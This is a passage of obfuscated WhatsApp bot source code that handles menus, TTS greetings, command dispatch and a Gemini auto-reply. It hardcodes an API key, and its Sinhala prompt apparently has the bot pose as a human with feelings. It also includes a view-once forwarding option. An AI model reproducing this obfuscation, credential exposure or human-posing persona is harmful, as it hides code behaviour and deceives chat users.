_0x19a2ce=['ioc2Uoc2SEc3Loc3G+c3J+c2UUc3MEc2MUc3IG','4lA74lEp4lEa4lANid0GC2vY','mtuWodGZoeHeqvjdrq','ioc2MUc2RUc2SsdGTRFGT4/GT4lGT4/GT4a','DuPbruW','nfHVDM9TwezUvW','icWGzNjPzw5KBa','Aw5KDsbmAxLHBG','y29UDgvUDhm','rxjYB3iGy2fSBa','EsdGTPhGTRtGT48Sioc2Loc2TIa','s3rrvha','4lA4idPhyxjMAwvS','4lEzioc2Toc2Q+c3KUc3Goc3Loc2QEc2UIa','icWG4lAT4lA74lEu4lARioc3G+c3KG','4lEs4lAT4lA74lAA4lEkioc2MUc3KUc2UUc2Sq','4lEzioc2SEc2UdOG','C1rktxG','4lEkioc2KIdGTPZGT5dGTReG4lAA4lEs','4lEk4lA34lA6ioc2Noc2SEc3IUc2SsdGTOy','y3rVCIGICMv0Dq','4lEp4lAVioc2Uoc2R+c2MUc3IIdGT4pGT5i','Aw91C2X5icWGzG','yvvdCu8','Dgv4Da','BhKG4lAr4lAAioc2R+c3MEc2SEc3IG','4lEp4lEc4lEp4lEa4lEz4lAX4lEkig1L','4lA74lEuioc2VEc2TUc3JYdGTPZGT5dGTRe','BMKTmI4WlwzSyq','4lA44lAX4lEk4lAT4lEk4Ocn4lA74lAR4lA6ioc2MUc2UW','BLDmEMy','4lAA4lEp4lA74lA64lEAihjLCgW','C2vHCMnO','Aw5MBW','Be5uugG','zcaSioc2Loc2TIbxAge','q29UDgvUDc1uEq','ndm1mtuWmgv4r1jXCa','nZCYndCZmwzevfbrzq','BNq/A2v5pq','CfvLwK8','ig1Lyw5PBMDMDq','DgfIBgu','zw1oBg4','4lA34lEp4lEc4lEp4lEaioc2Toc2Uoc2Q+c2MG','u01Urw4','Bs92mwjLDgeVBq','4lEp4lAC4lAX4lEk4lAXioc2TUc3Koc2U+c3KG','4lAXicWG4lAA4lA94lEs4lAX4lEkia','4lAT4lEpioc2MUc2U+c2SEc3IUc2SsWG','Aw5NieDLBwLUAq','C2GTzxHWoMDLBG','ioc2HEc2UUc3MEc2MUc3LcdGTPRGT5lGTRO','yxbWBgLJyxrPBW','EsdGTQ/GT5NGTRhGT4RGTReG4lAr4lA0','EsaSignYzwf0Aq','4lEu4lEa4lEAifrOyxjPBG','zxHJzxb0Aw9U','4lEs4lA94lEp4lEd4lA6ioc2T+c3J+c3Goc3KG','igvTB2PPzxmGla','qunxzfC','BNfKyLC','4lAX4lEu4lEcioc2VEc3MEc3GYbTzq','ioc3Goc3KUc2R+c3KUc3Hoc2PYdGTRJGT48','mtuYmtC0BhL3Cu5v','qwKG4lEd4lEeifrOyxi','Cg9ZDa','CMvHDgL2zsdGT4dGT5i','BMD1ywDLlMDVBW','quTMwLO','4lEkioc2T+c3J+c3Goc3KUc2REc3JYdGTPO','DMuGlcbLBw90Aq','4lA04lEpicWG4lAh4lEe4lEu4lEa4lEC','AgvHzgvYCW','yxbWBhK','BwjOww4','y29UC29Szq','nKzVrKrJAa','shPAv2q','BMn0Aw9UkcKG','AMHsDuS','4P2mieDHCMzPzwXK','ioc3Goc2Noc3MIdGTONGTQ3GT4/GTRGG','4lAh4lATioc3G+c3KUc2GUc3Hoc2VsdGTRC','B25HBcaSBg92zq','ChjVDg90ExbL','4lAA4lEs4lA74lEt4lA44lANioc2HUc2U+c2Ua','iefjioc2Toc3KUc3HEc3KUc2REc3La','zgf0yq','4lEu4lA74lEuioc2VEc2TUc3JYdGTPZGT5a','4lEd4lEk4lAT4lA7ioc2Toc3KUc2VEc3KUc2TG','4lEd4lEs4lAT4lEpihjLCgX5','ENr4A0u','4lA74lAX4lEk4lAXicWGDxnL','4lAN4lEdioc2Toc2Uoc2Q+c2MUc3IIdGTOy','4lEs4lA64lA9ioc3G+c3KUc2REc2SEc3IUc2Sq','Ahr0Chm6lY9Nzq','zxjYB3i','4lA44lEAioc2Uoc3Loc2VEc3IIdGTPRGT5W','4lAZioc2MUc3KUc2UUc2SEc3IUc2SsdGTPe','4lAX4lEt4lA44lANioc2HEc3G+c2Uoc2REc3IG','zsJGT4pGTOlGTPRGT5qPioc2H+c3GW','4lEa4lEs4lA6lIdWN5II','4lAT4lAX4lEk4lAXicWGkoc3G+c3KG','tNDjBLO','4lEt4lA44lANioc2HEc3G+c2Uoc2REc3IIa','4lEk4lAT4lA7icJGTPtGTRBGT5OG4lAX','ioc2R+c3MEc2SEc3IUc2SsWGsgK','AwfIBgvZoIOQcG','y2fUzgLKyxrLCW','ioc3Goc3KUc2UI4G8j+yOG','Dw5UEsa9ioc2HUc2REc2Vq','icWG4lAu4lA24lEaioc3Hoc3Koc2RW','wK1tyxi','kcGOlISPkYKRkq','mJq0oty0mffQBfDICW','4lAT4lA74lEu4lAR4lA64lEz4lAA4lEkioc2MG','Bg9N','ihjLCgX5ioc2VEc2TUc3JW','4lEz4lA4ioc2Loc2TUc2Noc3MIdGT4dGT5i','4lAXiaRGTPtGTRBGT5OG4lEa4lEs4lEd','4lAu4lA24lEaifDOyxrZyq','wNLcq1m','z2XLyxbPCY5JBW','ioc2OUc3K+c3Goc2REc3IIdGT4dGT5NGTRe','mtG0otyYm1bZC3j0Aa','4lEkioc2MUc3KUc2UUc2VsdGT4tGT5ZGTRO','D2fYBG','4lAc4lEe4lA9ioc2T+c3J+c3GUc3JYdGT4a','otm2rgzgyvL6','zxjHDgvdB250zq','mtaYodyXELngr0ni','EKjruu4','ndu5ouzcsZCW','ifDOyxrZyxbWia','iefqstO','C3nHz2uG4lAA4lA74lAX4lEk','rfjlwMS','B2rLBhmVz2vTAq','qKzAv0y','DwfPvevgB0XPna','4lA64lAX4lEk4lAXicWG4lAu4lA2ia','cI0Gu2vUzgvY4lAC','y29UC3rYDwn0BW','tNHswKi','4lEe4lEs4lA94lEuioc2MUc2U+c2SEc3IUc2Sq','zhuGtgL5yw5HzW','x19WCM90B19F','ioc2R+c3MEc2SEc3IUc2SsaSigm','lsbtzw5KzxiG4lAC','Dg9tDhjPBMC','4lEkicWGEw91id0G','BcbJCMvHDgL2zq','ywDLioc3Goc3KUc3G+c3KUc2SEc3IG','4lAu4lA64lEpicKG4lEa4lAC4lEAia','yMLUza','4lA44lEk4lA24lAX4lEk4lAWioc2MUc2UYa','4lA2ieDHCMzPzwXK','y29UDgvUDa','DhnHChaGqwKG4lA2','v25UzKC'];_0x5546=function(){return _0x19a2ce;};return _0x5546();}_0x143ecb();const GEMINI_API_KEY='AIzaSyAnGH'+_0x33da7e(0x16,0x54,0x74,0x70)+_0x33da7e(-0x4a,-0x33,-0x7f,-0x2b)+_0x33da7e(-0x3,0x4d,0x63,0x28),GEMINI_API_URL=_0xec7cba(0x2b1,0x285,0x243,0x299)+'nerativela'+_0x33da7e(0x4b,0xc,-0x20,-0x2)+_0x33da7e(0xa,0x43,-0x9,0x30)+_0x33da7e(-0x2e,-0xa,0x41,0x47)+_0xec7cba(0x28b,0x2af,0x2b4,0x269)+_0xec7cba(0x284,0x241,0x288,0x255)+_0x33da7e(0x3,-0x5,0x1e,0x11)+_0xec7cba(0x2c5,0x2a7,0x289,0x258)+_0xec7cba(0x26d,0x24c,0x239,0x23c)+GEMINI_API_KEY,aitext=body;if(botNumber!==senderNumber&&!isGroup&&aitext&&!aitext['startsWith']('.')){const prompt=_0xec7cba(0x2ed,0x29e,0x272,0x2cd)+'pp\x20Bot\x20plu'+'gin\x20එකකට\x20ස'+_0xec7cba(0x1f4,0x220,0x1e4,0x225)+_0xec7cba(0x23d,0x278,0x23f,0x25f)+_0x33da7e(-0x26,-0x1e,-0x5e,-0x5f)+'ssage\x20කරන්'+_0xec7cba(0x2e8,0x29d,0x2df,0x27b)+_0xec7cba(0x2d2,0x28f,0x27b,0x2d4)+_0xec7cba(0x262,0x231,0x226,0x21a)+_0xec7cba(0x250,0x248,0x232,0x219)+_0x33da7e(-0x61,-0x3a,-0x78,-0x4f)+'ොට්\x20කෙනෙක්'+_0xec7cba(0x2bc,0x295,0x24b,0x2cc)+_0xec7cba(0x234,0x25d,0x22c,0x256)+_0x33da7e(0xa,0x5a,0x48,0x5c)+_0xec7cba(0x2ba,0x28a,0x23b,0x252)+'ුවොත්\x20පමණක'+_0x33da7e(-0x59,-0x26,-0x64,-0x28)+_0x33da7e(0x2f,0x55,0x2e,0x57)+_0x33da7e(-0xc,0x3c,0x62,0x6d)+_0x33da7e(-0x22,0x27,-0x26,-0x26)+_0xec7cba(0x240,0x233,0x210,0x279)+_0x33da7e(0xc,0x48,0x1a,0x81)+_0x33da7e(-0x2e,0x2,-0x25,0x3)+_0x33da7e(0xa,-0x7,0x29,-0x4e)+'Senderගෙ\x20න'+_0x33da7e(0x56,0x2a,-0xd,0x55)+_0xec7cba(0x267,0x283,0x2a9,0x270)+_0x33da7e(0x2d,-0x1b,0x21,-0x66)+'න්න\x20,Funny'+_0xec7cba(0x267,0x22b,0x258,0x210)+_0xec7cba(0x235,0x25c,0x23b,0x273)+_0xec7cba(0x27b,0x26c,0x277,0x240)+_0xec7cba(0x23f,0x279,0x277,0x2c3)+'ly\x20වෙන්න\x20,'+'සිංහල\x20කථන\x20'+_0xec7cba(0x21c,0x251,0x28d,0x230)+_0xec7cba(0x232,0x26b,0x29b,0x22a)+_0xec7cba(0x2a9,0x282,0x2bf,0x267)+_0x33da7e(-0x36,-0xf,-0x1d,0x23)+_0x33da7e(0x59,0x60,0x21,0x6e)+_0xec7cba(0x22d,0x260,0x2b0,0x23b)+'\x20Bot\x20කෙනෙක'+_0xec7cba(0x272,0x2a3,0x296,0x2f3)+_0x33da7e(0x6,-0x9,0x37,-0x34)+_0x33da7e(-0x42,0x7,0x38,-0xc)+_0xec7cba(0x241,0x263,0x21b,0x285)+_0x33da7e(0x2e,0x50,0x41,0xb)+_0xec7cba(0x22a,0x255,0x217,0x26d)+'හොඳින්\x20අඳු'+'රන\x20ආකාරයට\x20'+_0x33da7e(0x18,0x23,0x5f,0x54)+'\x20කරන්න\x20=\x20ම'+_0x33da7e(0xc,0x3f,0x5c,0x8f)+_0xec7cba(0x2a4,0x27f,0x2a1,0x29b)+_0xec7cba(0x2a1,0x288,0x240,0x283)+_0x33da7e(-0x37,0x10,-0xa,-0x3b)+'ත්\x20පමණක්\x20ඔ'+_0xec7cba(0x238,0x221,0x1e2,0x1e9)+_0xec7cba(0x270,0x2ab,0x2b8,0x26a)+_0x33da7e(0x52,0x9,0x51,0x16)+_0x33da7e(-0x5e,-0x31,-0xb,0x7)+_0x33da7e(0x97,0x61,0x83,0x68)+'\x20හදපු\x20බව\x20ව'+_0x33da7e(0x2,-0x29,0x18,0x5)+'්න\x20)\x20සැබෑම'+_0xec7cba(0x24b,0x225,0x1e9,0x1ec)+_0xec7cba(0x227,0x277,0x2bc,0x2a7)+'හැඟීම්\x20බරව'+_0xec7cba(0x2cf,0x29b,0x260,0x2a5)+_0x33da7e(0x7d,0x33,0x52,0x5f)+'\x20වැනි\x20repl'+_0x33da7e(-0x33,-0x2,0xb,-0x35)+'ා\x20message\x20'+_0x33da7e(0x11,0x1e,-0x26,0x2d)+_0x33da7e(-0x5c,-0x25,-0x4f,-0x3a)+_0x33da7e(0x7,-0x19,0x35,-0x33)+_0xec7cba(0x229,0x22f,0x238,0x22d)+'ශ්‍රී\x20ලංකාවේ'+_0xec7cba(0x268,0x2a1,0x27c,0x26f)+_0xec7cba(0x24f,0x259,0x26e,0x258)+_0x33da7e(-0x6e,-0x23,0xa,-0x1c)+_0x33da7e(0x0,0x2f,0x6f,0x4c)+_0x33da7e(-0x29,-0x37,-0x33,0x12)+_0x33da7e(-0x59,-0x22,-0x38,-0x3d)+_0xec7cba(0x270,0x294,0x264,0x29d)+_0x33da7e(0x87,0x5f,0x33,0x65)+_0xec7cba(0x298,0x2bf,0x2a1,0x2f7)+'සිංහල\x20තරුණ'+_0xec7cba(0x276,0x228,0x250,0x1f2)+_0xec7cba(0x2ea,0x2b9,0x2d0,0x2d7)+_0xec7cba(0x25e,0x268,0x272,0x24f)+_0x33da7e(0x12,0x59,0x5f,0x95)+'\x20\x20\x20\x0a\x0a**Var'+_0xec7cba(0x294,0x291,0x281,0x266)+_0x33da7e(0x12,0x5d,0x89,0x19)+_0x33da7e(0x21,-0x28,-0x2d,-0x57)+pushname+(_0x33da7e(0x8c,0x56,0x1c,0x31)+_0x33da7e(-0x5b,-0x2b,-0x39,-0x5a)+':\x20')+aitext+('\x20\x0a\x20ඔබේ\x20rep'+_0x33da7e(-0x1d,-0x1f,0x30,0x2f)+'න\x0a\x0a\x0a--'),_0x117761={};_0x117761[_0x33da7e(-0x17,-0x20,0x12,-0x4)]=prompt;const _0x248f7c={};_0x248f7c['parts']=[_0x117761];const _0x4da3c1={};_0x4da3c1[_0xec7cba(0x22f,0x22d,0x1ea,0x23e)]=[_0x248f7c];const payload=_0x4da3c1;try{const _0x3d3d04={};_0x3d3d04[_0x33da7e(-0x20,-0x14,0xe,-0x2d)+'pe']=_0x33da7e(-0x4a,-0x3,-0x19,-0x54)+'n/json';const _0x565ac7={};_0x565ac7[_0xec7cba(0x29b,0x26e,0x27d,0x23b)]=_0x3d3d04;const response=await axios[_0x33da7e(0x1c,0xa,-0x1,0x16)](GEMINI_API_URL,payload,_0x565ac7);if(!response[_0xec7cba(0x2a7,0x27d,0x263,0x290)]||!response[_0x33da7e(0x5f,0x20,-0x25,0x45)][_0x33da7e(0x7f,0x35,0x8,-0x5)]||!response[_0x33da7e(-0x1d,0x20,0x24,0x17)]['candidates'][-0x2*0xe5d+0x1aa7+-0x1*-0x213]?.[_0xec7cba(0x1f5,0x222,0x209,0x221)]?.['parts'])return reply('❌\x20AI\x20පිළිත'+_0x33da7e(0x64,0x21,0xa,0xd)+_0x33da7e(-0x10,0x2c,0x29,-0x22)+_0x33da7e(0x10,0x36,0x32,0x77));const aiResponse=response[_0xec7cba(0x253,0x27d,0x26e,0x2ae)][_0xec7cba(0x24b,0x292,0x2a1,0x24f)][-0x1a49+-0x36*-0x55+0x85b]['content']['parts'][0x1887+0x2*0x72b+-0x1*0x26dd][_0x33da7e(-0x5a,-0x20,-0x46,-0x29)];await reply(''+aiResponse);}catch(_0x1d6cf2){console[_0xec7cba(0x2b8,0x286,0x24f,0x2a7)](_0xec7cba(0x274,0x22e,0x231,0x26e)+'ing\x20Gemini'+_0x33da7e(0x4a,0x4f,0x1f,0x1d),_0x1d6cf2),reply(_0x33da7e(0xc,0x19,-0x2a,0x6)+_0x33da7e(-0x1a,0x1f,-0x2c,0x17)+'රු\x20ලබා\x20ගැන'+_0x33da7e(0x2c,0x31,0x63,-0x1b)+_0x33da7e(0x22,0x2e,0x6a,0x73));}}
//Menu 
 const _0x67059b=_0x599d;function _0x40d7(){const _0x3fc1d2=['15790027UwEfUT','trace','.Omenu','table','PANEL','88830vvZIlw','search','https://raw.githubusercontent.com/xnodesdev/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg','630fmrPKK','2ahyvdF','warn','ALL','2140590YwvZZW','arraybuffer','writeFileSync','console','constructor','.omenu','exception','data','DOWNLOAD','.Alive','get','apply','getAudioUrl','{}.constructor(\x22return\x20this\x22)(\x20)','4381480bcgLGl','.dlmenu','FUN','695987xFLwaW','bind','https://translate.google.com','toString','.Cmenu','.Dlmenu','audio/mp4','.menu','▬\x0a▎\x20Hi\x20','4260hRARmf','__proto__','length','.allmenu','4GihiHX','730209BkLzru','.cmenu','\x20👋\x20\x0a▎','350sMJihU',',\x20I\x20am\x20Garfield\x20bot.','(((.+)+)+)+$','sendMessage','binary','OWNER'];_0x40d7=function(){return _0x3fc1d2;};return _0x40d7();}(function(_0x1892f3,_0x61da68){const _0x206021=_0x599d,_0x796f6d=_0x1892f3();while(!![]){try{const _0x3ae542=-parseInt(_0x206021(0x1a8))/0x1+parseInt(_0x206021(0x1c8))/0x2*(parseInt(_0x206021(0x1b6))/0x3)+-parseInt(_0x206021(0x1b5))/0x4*(parseInt(_0x206021(0x1cb))/0x5)+parseInt(_0x206021(0x1b1))/0x6*(-parseInt(_0x206021(0x1b9))/0x7)+parseInt(_0x206021(0x1a5))/0x8+-parseInt(_0x206021(0x1c7))/0x9*(parseInt(_0x206021(0x1c4))/0xa)+parseInt(_0x206021(0x1bf))/0xb;if(_0x3ae542===_0x61da68)break;else _0x796f6d['push'](_0x796f6d['shift']());}catch(_0xdce064){_0x796f6d['push'](_0x796f6d['shift']());}}}(_0x40d7,0x6caca));function _0x599d(_0x2709d8,_0x1ae343){const _0x2f9ba7=_0x40d7();return _0x599d=function(_0x2d0a41,_0x443847){_0x2d0a41=_0x2d0a41-0x1a1;let _0x201896=_0x2f9ba7[_0x2d0a41];return _0x201896;},_0x599d(_0x2709d8,_0x1ae343);}const _0x18f391=(function(){let _0x373922=!![];return function(_0x18a7db,_0x465170){const _0x18b9ad=_0x373922?function(){const _0x13d175=_0x599d;if(_0x465170){const _0x398487=_0x465170[_0x13d175(0x1a2)](_0x18a7db,arguments);return _0x465170=null,_0x398487;}}:function(){};return _0x373922=![],_0x18b9ad;};}()),_0x36b3f3=_0x18f391(this,function(){const _0x27af60=_0x599d;return _0x36b3f3[_0x27af60(0x1ab)]()[_0x27af60(0x1c5)](_0x27af60(0x1bb))[_0x27af60(0x1ab)]()[_0x27af60(0x1cf)](_0x36b3f3)[_0x27af60(0x1c5)](_0x27af60(0x1bb));});_0x36b3f3();const _0x443847=(function(){let _0x1b1090=!![];return function(_0x14aa8d,_0x39fa13){const _0x13245f=_0x1b1090?function(){const _0x2e74c5=_0x599d;if(_0x39fa13){const _0x35532f=_0x39fa13[_0x2e74c5(0x1a2)](_0x14aa8d,arguments);return _0x39fa13=null,_0x35532f;}}:function(){};return _0x1b1090=![],_0x13245f;};}()),_0x2d0a41=_0x443847(this,function(){const _0x1a883b=_0x599d;let _0x40e07f;try{const _0x228b83=Function('return\x20(function()\x20'+_0x1a883b(0x1a4)+');');_0x40e07f=_0x228b83();}catch(_0x3ebfda){_0x40e07f=window;}const _0x3f1da6=_0x40e07f[_0x1a883b(0x1ce)]=_0x40e07f[_0x1a883b(0x1ce)]||{},_0x1159a7=['log',_0x1a883b(0x1c9),'info','error',_0x1a883b(0x1d1),_0x1a883b(0x1c2),_0x1a883b(0x1c0)];for(let _0x2fb70e=0x0;_0x2fb70e<_0x1159a7[_0x1a883b(0x1b3)];_0x2fb70e++){const _0x2e5c61=_0x443847[_0x1a883b(0x1cf)]['prototype'][_0x1a883b(0x1a9)](_0x443847),_0x3b967f=_0x1159a7[_0x2fb70e],_0x1a4250=_0x3f1da6[_0x3b967f]||_0x2e5c61;_0x2e5c61[_0x1a883b(0x1b2)]=_0x443847[_0x1a883b(0x1a9)](_0x443847),_0x2e5c61[_0x1a883b(0x1ab)]=_0x1a4250[_0x1a883b(0x1ab)][_0x1a883b(0x1a9)](_0x1a4250),_0x3f1da6[_0x3b967f]=_0x2e5c61;}});_0x2d0a41();(body===_0x67059b(0x1af)||body==='.Menu'||body==='.alive'||body===_0x67059b(0x1d4))&&await conn[_0x67059b(0x1bc)](from,{'image':{'url':_0x67059b(0x1c6)},'caption':_0x67059b(0x1b0)+pushname+_0x67059b(0x1b8)+mfig[_0x67059b(0x1c3)]},{'quoted':mek});(body===_0x67059b(0x1b4)||body==='.Allmenu')&&await conn['sendMessage'](from,{'image':{'url':_0x67059b(0x1c6)},'caption':''+mfig[_0x67059b(0x1ca)]},{'quoted':mek});(body===_0x67059b(0x1a6)||body===_0x67059b(0x1ad))&&await conn[_0x67059b(0x1bc)](from,{'image':{'url':_0x67059b(0x1c6)},'caption':''+mfig[_0x67059b(0x1d3)]},{'quoted':mek});(body===_0x67059b(0x1b7)||body===_0x67059b(0x1ac))&&await conn[_0x67059b(0x1bc)](from,{'image':{'url':_0x67059b(0x1c6)},'caption':''+mfig['CONV']},{'quoted':mek});(body===_0x67059b(0x1d0)||body===_0x67059b(0x1c1))&&await conn[_0x67059b(0x1bc)](from,{'image':{'url':_0x67059b(0x1c6)},'caption':''+mfig[_0x67059b(0x1be)]},{'quoted':mek});(body==='.fmenu'||body==='.Fmenu')&&await conn[_0x67059b(0x1bc)](from,{'image':{'url':'https://raw.githubusercontent.com/xnodesdev/GARFIELD-WHATSAPP-BOT-v10/refs/heads/master/lib/Picsart_25-01-30_13-20-39-871.jpg'},'caption':''+mfig[_0x67059b(0x1a7)]},{'quoted':mek});if(body==='hi'){const ttsText='Hi\x20'+pushname+_0x67059b(0x1ba),ttsUrl=googleTTS[_0x67059b(0x1a3)](ttsText,{'lang':'en','slow':![],'host':_0x67059b(0x1aa)}),response=await axios[_0x67059b(0x1a1)](ttsUrl,{'responseType':_0x67059b(0x1cc)}),ttsBuffer=Buffer['from'](response[_0x67059b(0x1d2)],_0x67059b(0x1bd)),ttsFilePath='tts_hi.mp3';fs[_0x67059b(0x1cd)](ttsFilePath,ttsBuffer),await conn[_0x67059b(0x1bc)](from,{'audio':{'url':ttsFilePath},'mimetype':_0x67059b(0x1ae),'ptt':!![]},{'quoted':mek}),fs['unlinkSync'](ttsFilePath);}
        
const _0x3ad644=_0x38cf;(function(_0x4e0b47,_0x247db5){const _0x55934b=_0x38cf,_0x270d9b=_0x4e0b47();while(!![]){try{const _0x4936b3=parseInt(_0x55934b(0xb7))/0x1+parseInt(_0x55934b(0xbc))/0x2*(-parseInt(_0x55934b(0xac))/0x3)+-parseInt(_0x55934b(0xb8))/0x4+-parseInt(_0x55934b(0xb2))/0x5+-parseInt(_0x55934b(0xaf))/0x6+parseInt(_0x55934b(0xb0))/0x7*(parseInt(_0x55934b(0xa1))/0x8)+-parseInt(_0x55934b(0xa7))/0x9*(-parseInt(_0x55934b(0xb1))/0xa);if(_0x4936b3===_0x247db5)break;else _0x270d9b['push'](_0x270d9b['shift']());}catch(_0x431881){_0x270d9b['push'](_0x270d9b['shift']());}}}(_0x320e,0x9d55c));function _0x320e(){const _0x2c32fb=['(((.+)+)+)+$','audio/mp4','sendMessage','error','Hi\x20','1923304FpfFjn','__proto__','length','getAudioUrl',',\x20I\x20am\x20Garfield\x20bot.',',\x20good\x20morning\x20.','8868519pcCvic','exception','https://translate.google.com','apply','get','9wMlihs','prototype','return\x20(function()\x20','5404806twdHZv','14DxnZEQ','20tufCHB','4254850EbJmCl',',\x20good\x20night.','table','from','binary','761547cbqjUo','1468576sWIEYh','writeFileSync','console','arraybuffer','299864dTXuhp','{}.constructor(\x22return\x20this\x22)(\x20)','bind','data','search','constructor','tts_hi.mp3','unlinkSync','toString','good\x20night','warn'];_0x320e=function(){return _0x2c32fb;};return _0x320e();}const _0x51f8c8=(function(){let _0x43720c=!![];return function(_0x329f5e,_0x583140){const _0x3a57f4=_0x43720c?function(){const _0x165e47=_0x38cf;if(_0x583140){const _0xc9910=_0x583140[_0x165e47(0xaa)](_0x329f5e,arguments);return _0x583140=null,_0xc9910;}}:function(){};return _0x43720c=![],_0x3a57f4;};}()),_0x1fa9fe=_0x51f8c8(this,function(){const _0x1e1d5b=_0x38cf;return _0x1fa9fe[_0x1e1d5b(0x99)]()['search'](_0x1e1d5b(0x9c))[_0x1e1d5b(0x99)]()[_0x1e1d5b(0x96)](_0x1fa9fe)[_0x1e1d5b(0x95)](_0x1e1d5b(0x9c));});_0x1fa9fe();function _0x38cf(_0x3ba517,_0x218990){const _0x5e8e90=_0x320e();return _0x38cf=function(_0x3c9afe,_0x1206b6){_0x3c9afe=_0x3c9afe-0x92;let _0xb07869=_0x5e8e90[_0x3c9afe];return _0xb07869;},_0x38cf(_0x3ba517,_0x218990);}const _0x1206b6=(function(){let _0x59a8b8=!![];return function(_0x497bfa,_0x350d29){const _0x505c68=_0x59a8b8?function(){if(_0x350d29){const _0x20b2bd=_0x350d29['apply'](_0x497bfa,arguments);return _0x350d29=null,_0x20b2bd;}}:function(){};return _0x59a8b8=![],_0x505c68;};}()),_0x3c9afe=_0x1206b6(this,function(){const _0x3ece1e=_0x38cf;let _0x144ff3;try{const _0x1dc9bb=Function(_0x3ece1e(0xae)+_0x3ece1e(0x92)+');');_0x144ff3=_0x1dc9bb();}catch(_0x1d78cb){_0x144ff3=window;}const _0x39aaf6=_0x144ff3[_0x3ece1e(0xba)]=_0x144ff3['console']||{},_0x201534=['log',_0x3ece1e(0x9b),'info',_0x3ece1e(0x9f),_0x3ece1e(0xa8),_0x3ece1e(0xb4),'trace'];for(let _0x329bd1=0x0;_0x329bd1<_0x201534[_0x3ece1e(0xa3)];_0x329bd1++){const _0x55c565=_0x1206b6[_0x3ece1e(0x96)][_0x3ece1e(0xad)][_0x3ece1e(0x93)](_0x1206b6),_0x1d722d=_0x201534[_0x329bd1],_0x2f06cc=_0x39aaf6[_0x1d722d]||_0x55c565;_0x55c565[_0x3ece1e(0xa2)]=_0x1206b6[_0x3ece1e(0x93)](_0x1206b6),_0x55c565[_0x3ece1e(0x99)]=_0x2f06cc['toString'][_0x3ece1e(0x93)](_0x2f06cc),_0x39aaf6[_0x1d722d]=_0x55c565;}});_0x3c9afe();if(body==='Hi'){const ttsText=_0x3ad644(0xa0)+pushname+_0x3ad644(0xa5),ttsUrl=googleTTS[_0x3ad644(0xa4)](ttsText,{'lang':'en','slow':![],'host':_0x3ad644(0xa9)}),response=await axios[_0x3ad644(0xab)](ttsUrl,{'responseType':_0x3ad644(0xbb)}),ttsBuffer=Buffer[_0x3ad644(0xb5)](response[_0x3ad644(0x94)],_0x3ad644(0xb6)),ttsFilePath=_0x3ad644(0x97);fs['writeFileSync'](ttsFilePath,ttsBuffer),await conn['sendMessage'](from,{'audio':{'url':ttsFilePath},'mimetype':'audio/mp4','ptt':!![]},{'quoted':mek}),fs['unlinkSync'](ttsFilePath);}if(body==='good\x20morning'){const ttsText=pushname+_0x3ad644(0xa6),ttsUrl=googleTTS['getAudioUrl'](ttsText,{'lang':'en','slow':![],'host':_0x3ad644(0xa9)}),response=await axios[_0x3ad644(0xab)](ttsUrl,{'responseType':'arraybuffer'}),ttsBuffer=Buffer[_0x3ad644(0xb5)](response['data'],_0x3ad644(0xb6)),ttsFilePath=_0x3ad644(0x97);fs['writeFileSync'](ttsFilePath,ttsBuffer),await conn[_0x3ad644(0x9e)](from,{'audio':{'url':ttsFilePath},'mimetype':_0x3ad644(0x9d),'ptt':!![]},{'quoted':mek}),fs[_0x3ad644(0x98)](ttsFilePath);}if(body===_0x3ad644(0x9a)){const ttsText=_0x3ad644(0xa0)+pushname+_0x3ad644(0xb3),ttsUrl=googleTTS[_0x3ad644(0xa4)](ttsText,{'lang':'en','slow':![],'host':_0x3ad644(0xa9)}),response=await axios[_0x3ad644(0xab)](ttsUrl,{'responseType':_0x3ad644(0xbb)}),ttsBuffer=Buffer[_0x3ad644(0xb5)](response[_0x3ad644(0x94)],'binary'),ttsFilePath=_0x3ad644(0x97);fs[_0x3ad644(0xb9)](ttsFilePath,ttsBuffer),await conn[_0x3ad644(0x9e)](from,{'audio':{'url':ttsFilePath},'mimetype':'audio/mp4','ptt':!![]},{'quoted':mek}),fs[_0x3ad644(0x98)](ttsFilePath);}
  //==========WORKTYPE============ 
  if(!isOwner && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return

  // take commands 
                 
  const events = require('./command')
  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
  if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
  
  try {
  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
  } catch (e) {
  console.error("[PLUGIN ERROR] " + e);
  }
  }
  }
  events.commands.map(async(command) => {
  if (body && command.on === "body") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (mek.q && command.on === "text") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  (command.on === "image" || command.on === "photo") &&
  mek.type === "imageMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  command.on === "sticker" &&
  mek.type === "stickerMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  }});
  
  });
    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
